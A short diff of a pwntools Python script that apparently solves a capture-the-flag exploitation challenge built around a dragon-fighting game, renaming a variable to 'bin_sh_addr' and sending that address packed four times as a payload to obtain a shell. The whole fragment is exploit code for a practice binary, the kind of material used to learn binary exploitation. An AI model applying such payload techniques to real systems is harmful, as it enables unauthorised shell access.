@@ -1,6 +1,6 @@
 from pwn import *
 
-addres = 0x08048dbf
+bin_sh_addr = 0x08048dbf
 
 PRIEST = 1
 KNIGHT = 2
@@ -67,7 +67,7 @@ while dragon_health < 128:
 
 win_in()
 
-payload = p32(addres) * 4
+payload = p32(bin_sh_addr) * 4
 
 r.sendline(payload)
 log.info("pwned!")
